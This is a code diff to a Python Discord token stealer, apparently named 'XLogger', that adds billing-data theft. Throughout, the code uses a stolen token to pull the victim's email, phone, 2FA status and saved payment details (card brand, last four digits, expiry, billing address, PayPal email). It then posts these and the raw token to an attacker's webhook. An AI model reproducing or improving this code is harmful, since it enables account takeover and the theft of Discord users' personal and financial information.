@@ -54,65 +54,170 @@ def sysinfo():
     
     sysinfo = requests.post(webhook, headers=wheaders, json=payload)
 
+#billing info from https://github.com/wodxgod/DTI
 def verifytks(token):
-        headers = {
-            "authority": "discord.com",
-            "authorization": token,
-            "Content-Type": "application/json",
-            "accept": "*/*",
-            "Accept-Encoding": "gzip, deflate",
-            "accept-language": "en-US,en;q=0.9",
-            "origin": "https://discord.com",
-            "referer": "https://discord.com/channels/@me",
-            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-platform": '"Windows"',
-            "sec-fetch-dest": "empty",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-site": "same-origin",
-            "x-debug-options": "bugReporterEnabled",
-            "x-discord-locale": "en-US",
-            "x-discord-timezone": "America/New_York",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
-            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTM1LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjM5MTczOCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZX0==",
+    headers = {
+        "authority": "discord.com",
+        "authorization": token,
+        "Content-Type": "application/json",
+        "accept": "*/*",
+        "Accept-Encoding": "gzip, deflate",
+        "accept-language": "en-US,en;q=0.9",
+        "origin": "https://discord.com",
+        "referer": "https://discord.com/channels/@me",
+        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "x-debug-options": "bugReporterEnabled",
+        "x-discord-locale": "en-US",
+        "x-discord-timezone": "America/New_York",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
+        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTM1LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjM5MTczOCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZX0==",
+    }
+
+    res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
+    invalidtoks = []
+
+    if res.status_code == 200:
+        def hook(webhook):
+            userinfo = res.json()
+            username = userinfo.get('username', "N/A")
+            email = userinfo.get('email', "N/A")
+            user_id = userinfo.get('id')
+            avatar = userinfo.get('avatar')
+            phone = userinfo.get('phone', "N/A")
+            bio = userinfo.get('bio') or "None"
+            nitro = "True" if userinfo.get("premium_type") else "False"
+            mfa = "True" if userinfo.get("mfa_enabled") else "False"
+            locale = userinfo.get('locale')
+            pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}" if avatar else "None"
+
+            # Billing Info Logic
+            billing_fields = []
+            cc_digits = {"visa": "4", "mastercard": "5", "amex": "3", "discover": "6"}
+
+            try:
+                billing_req = requests.get(
+                    'https://discord.com/api/v6/users/@me/billing/payment-sources',
+                    headers=headers, timeout=10
+                )
+
+                if billing_req.status_code == 200 and isinstance(billing_req.json(), list) and billing_req.json():
+                    for x in billing_req.json():
+                        y = x['billing_address']
+                        name = y['name']
+                        address_1 = y['line_1']
+                        address_2 = y.get('line_2', '')
+                        city = y['city']
+                        postal_code = y['postal_code']
+                        state = y.get('state', '')
+                        country = y['country']
+
+                        if x['type'] == 1:
+                            cc_brand = x['brand']
+                            cc_first = cc_digits.get(cc_brand.lower(), '*')
+                            cc_last = x['last_4']
+                            cc_month = str(x['expires_month']).zfill(2)
+                            cc_year = str(x['expires_year'])
+
+                            cc_number = ''.join(
+                                z if (i + 1) % 2 else z + ' '
+                                for i, z in enumerate(cc_first + ('*' * 11) + cc_last)
+                            )
+
+                            value = (
+                                f"💳 **Credit Card**\n"
+                                f"• Holder: `{name}`\n"
+                                f"• Brand: `{cc_brand}`\n"
+                                f"• Number: `{cc_number}`\n"
+                                f"• Expiry: `{cc_month}/{cc_year[2:4]}`\n"
+                                f"• Address: `{address_1} {address_2}`\n"
+                                f"• City/State: `{city}, {state}`\n"
+                                f"• Country: `{country}`\n"
+                                f"• ZIP: `{postal_code}`\n"
+                                f"• Default: `{x['default']}`\n"
+                                f"• Valid: `{not x['invalid']}`"
+                            )
+
+                        elif x['type'] == 2:
+                            value = (
+                                f"🅿️ **PayPal**\n"
+                                f"• Name: `{name}`\n"
+                                f"• Email: `{x['email']}`\n"
+                                f"• Address: `{address_1} {address_2}`\n"
+                                f"• City/State: `{city}, {state}`\n"
+                                f"• Country: `{country}`\n"
+                                f"• ZIP: `{postal_code}`\n"
+                                f"• Default: `{x['default']}`\n"
+                                f"• Valid: `{not x['invalid']}`"
+                            )
+
+                        billing_fields.append({
+                            "name": "💰 Billing Info",
+                            "value": value,
+                            "inline": False
+                        })
+                else:
+                    billing_fields.append({
+                        "name": "💰 Billing Info",
+                        "value": "`None`",
+                        "inline": False
+                    })
+
+            except Exception:
+                billing_fields.append({
+                    "name": "💰 Billing Info",
+                    "value": "`None`",
+                    "inline": False
+                })
+
+            # Final Embed Payload
+            payload = {
+                "content": "||@everyone||",
+                "embeds": [
+                    {
+                        "color": 3646683,
+                        "fields": [
+                            {"name": "👤 Username", "value": f"`{username}`"},
+                            {"name": "🪙 Token", "value": f"`{token}`"},
+                            {"name": "✉️ Email", "value": f"`{email}`"},
+                            {"name": "📞 Phone", "value": f"`{phone}`"},
+                            {"name": "🤔 Bio", "value": f"`{bio}`"},
+                            {"name": "📷 PFP", "value": f"{pfp}"},
+                            {"name": "🔑 2FA", "value": f"`{mfa}`"},
+                            {"name": "💔 Nitro", "value": f"`{nitro}`", "inline": True},
+                            {"name": "🤓 Locale", "value": f"`{locale}`"},
+                            *billing_fields
+                        ],
+                        "footer": {"text": "Logged by XLogger"}
+                    }
+                ],
+                "username": "TS | Valid",
+                "attachments": []
+            }
+
+            response = requests.post(webhook, headers={"Content-Type": "application/json"}, json=payload)
+            print(response.text)
+
+        hook(webhook)
+
+    else:
+        invalidtoks.append(token)
+
+    if invalidtoks:
+        payload = {
+            "embeds": [
+                {
+                    "color": 12259344,
+                    "fields": [{"name": "❌ Invalid Tokens", "value": "\n".join(f"`{t}`" for t in invalidtoks)}]
+                }
+            ],
+            "username": "TS | Invalid",
+            "attachments": []
         }
-
-        res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
-        gift = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions/payment-sources') #ts is scrapped because i didnt feel like making this
-        invalidtoks = []
-        def get(invalidtoks):
-            if invalidtoks:
-                inv = "\n".join(f"`{t}`" for t in invalidtoks)
-                
-
-        if res.status_code == 200:
-            print(f'NEW TOKEN LOGGED\n \n {token} \n info: \n{res.text}, {gift.text}')
-            def hook(webhook):
-                userinfo = res.json()
-                username = userinfo.get('username', "N/A")
-                email = userinfo.get('email', "N/A")
-                id = userinfo.get('id')
-                avatar = userinfo.get('avatar')
-                pfp = f"https://cdn.discordapp.com/avatars/{id}/{avatar}" if avatar != None else "'None'"
-                phone = userinfo.get('phone', "N/A")
-                bio = userinfo.get('bio')
-                avatarurl = f"https://cdn.discordapp.com/avatars/{id}/{avatar}" if userinfo.get('avatar') else "None"  
-                bioo = bio if userinfo.get('bio') else "None"
-                nitro = "True" if userinfo.get("premium_type") else "False"
-                mfa = "True" if userinfo.get("mfa_enabled") else "False"
-                locale = userinfo.get('locale')
-                
-                payload = {"content":"||@everyone||","embeds":[{"color":3646683,"fields":[{"name":"👤 Username","value":f"`{username}`"},{"name":"🪙 Token","value":f"`{token}`"},{"name":"✉️ Email","value":f"`{email}`"},{"name":"📞 Phone","value":f"`{phone}`"},{"name":"🤔 Bio","value":f"`{bioo}`"},{"name":"📷 PFP","value":f"{pfp}"},{"name":"🔑 2FA","value":f"{mfa}"},{"name":"💔 Nitro","value":f"{nitro}","inline":True},{"name":"🤓 Locale","value":f"`{locale}`"}],"footer":{"text":"Logged by XLogger"}}],"username":"TS | Valid","attachments":[]}
-                webhook = requests.post(webhook, headers=wheaders, json=payload)
-                print(webhook.text)
-            hook(webhook)
-        else:
-            invalidtoks.append(token)
-        if invalidtoks:
-            d = get(invalidtoks)
-            payload = {"embeds":[{"color":12259344,"fields":[{"name":"❌ Invalid Tokens","value":f"```{d}```"}]}],"username":"TS | Invalid","attachments":[]}
-
-            
 
 def distks():
     for dis in discordapps:
